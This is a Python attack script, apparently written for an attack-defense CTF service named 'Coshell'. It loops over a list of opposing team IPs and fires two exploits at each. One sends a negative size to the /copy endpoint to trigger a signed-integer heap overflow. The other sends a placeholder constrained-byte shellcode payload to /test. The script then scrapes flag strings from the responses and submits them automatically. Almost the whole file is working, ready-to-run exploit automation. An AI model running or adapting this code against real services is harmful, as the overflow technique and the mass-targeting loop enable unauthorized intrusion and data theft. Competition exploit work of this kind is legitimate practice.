#!/usr/bin/env python3
"""
Coshell AWD Exploit
- Tests heap overflow and shellcode paths
- Patches applied fix signed integer overflow in /copy
"""
import os
os.environ['PWNLIB_NOTERM'] = '1'

import sys
script_dir = os.path.dirname(os.path.abspath(__file__))
if script_dir in sys.path:
    sys.path.remove(script_dir)

import argparse
import time
import threading
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import pwntools after removing script dir
from pwn import *

# Add back for awd_lib
sys.path.insert(0, script_dir)
from awd_lib import chal, submit, get_targets, get_our_ip

# Rate limit submissions
_submit_lock = threading.Lock()
_last_submit = 0
SUBMIT_DELAY = 0.5

def rate_limited_submit(flag):
    global _last_submit
    with _submit_lock:
        elapsed = time.time() - _last_submit
        if elapsed < SUBMIT_DELAY:
            time.sleep(SUBMIT_DELAY - elapsed)
        result = submit(flag)
        _last_submit = time.time()
        return result

context.log_level = 'error'
chal(creds_file="coshell.xls")

PORT = 1000
TIMEOUT = 5
MAX_WORKERS = 8


def make_request(method, endpoint, body):
    """Build HTTP request"""
    if isinstance(body, str):
        body = body.encode()
    req = f'{method} {endpoint} HTTP/1.1\r\n'.encode()
    req += f'Content-Length: {len(body)}\r\n\r\n'.encode()
    req += body
    return req


def exploit_heap_overflow(ip, port=PORT):
    """
    Attempt heap overflow exploit via /copy with size=-1
    The signed integer comparison allows negative sizes to pass validation
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, port))
        
        # Get initial "work"
        sock.recv(1024)
        
        def send_recv(data, wait=0.3):
            sock.sendall(data)
            time.sleep(wait)
            sock.setblocking(False)
            resp = b''
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except:
                pass
            sock.setblocking(True)
            return resp
        
        # Allocate slots
        for i in range(2):
            body = f'{{"index": {i}, "size": 255, "data_size": 8, "data": "TESTDATA"}}'
            send_recv(make_request('POST', '/add', body))
        
        # Trigger heap overflow
        body = '{"dst": 0, "src": 1, "size": -1}'
        resp = send_recv(make_request('POST', '/copy', body), wait=1)
        
        # Check if anything interesting leaked
        if b'flag{' in resp:
            sock.close()
            start = resp.find(b'flag{')
            end = resp.find(b'}', start) + 1
            return resp[start:end].decode()
        
        sock.close()
        return None
    except:
        return None


def exploit_shellcode(ip, port=PORT):
    """
    Attempt shellcode execution via /test endpoint
    Constrained to bytes 0x00-0x05 only
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        sock.connect((ip, port))
        
        sock.recv(1024)  # "work"
        
        # Build minimal shellcode with available bytes
        # ADD AL, imm8 (04 XX) and ADD EAX, imm32 (05 XX XX XX XX)
        # ADD [RIP+disp], AL (00 05 DD DD DD DD)
        
        # For now, just test if endpoint works
        shellcode = b'\x04\x05' * 125  # 250 bytes of ADD AL, 5
        
        body = shellcode
        req = f'POST /test HTTP/1.1\r\nContent-Length: {len(body)}\r\n\r\n'.encode() + body
        sock.sendall(req)
        
        time.sleep(1)
        sock.setblocking(False)
        resp = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                resp += chunk
        except:
            pass
        
        sock.close()
        
        if b'flag{' in resp:
            start = resp.find(b'flag{')
            end = resp.find(b'}', start) + 1
            return resp[start:end].decode()
        
        return None
    except:
        return None


def attack_target(ip, port=PORT):
    """Attack single target with multiple methods"""
    # Try heap overflow
    flag = exploit_heap_overflow(ip, port)
    if flag:
        result = rate_limited_submit(flag)
        status = "NEW" if result.get('success') and not result.get('duplicate') else \
                 "dup" if result.get('duplicate') else f"reject"
        return (ip, flag, status, "heap")
    
    # Try shellcode
    flag = exploit_shellcode(ip, port)
    if flag:
        result = rate_limited_submit(flag)
        status = "NEW" if result.get('success') and not result.get('duplicate') else \
                 "dup" if result.get('duplicate') else f"reject"
        return (ip, flag, status, "shellcode")
    
    return (ip, None, "failed", None)


def main():
    parser = argparse.ArgumentParser(description='Coshell AWD Exploit')
    parser.add_argument('--target', '-t', help='Single target IP')
    parser.add_argument('--port', '-p', type=int, default=PORT)
    parser.add_argument('--loop', action='store_true', help='Loop continuously')
    parser.add_argument('--delay', type=int, default=60, help='Loop delay')
    parser.add_argument('--workers', '-w', type=int, default=MAX_WORKERS)
    args = parser.parse_args()
    
    our_ip = get_our_ip()
    targets = [args.target] if args.target else get_targets()
    
    # Filter out our own IP
    targets = [t for t in targets if t != our_ip]
    
    print(f"[*] Our IP: {our_ip}, Targets: {len(targets)}, Workers: {args.workers}")
    
    while True:
        success = failed = new_flags = 0
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=args.workers) as executor:
            futures = {executor.submit(attack_target, ip, args.port): ip for ip in targets}
            
            for future in as_completed(futures):
                ip, flag, status, method = future.result()
                if flag:
                    m = f"[{method}]" if method else ""
                    print(f"[+] {ip}: {flag} ({status}) {m}")
                    success += 1
                    if status == "NEW":
                        new_flags += 1
                else:
                    print(f"[-] {ip}: {status}")
                    failed += 1
        
        elapsed = time.time() - start_time
        print(f"[*] Round: {success} ok, {failed} fail, {new_flags} NEW ({elapsed:.1f}s)")
        
        if not args.loop:
            break
        print(f"[*] Sleeping {args.delay}s...")
        time.sleep(args.delay)


if __name__ == '__main__':
    main()
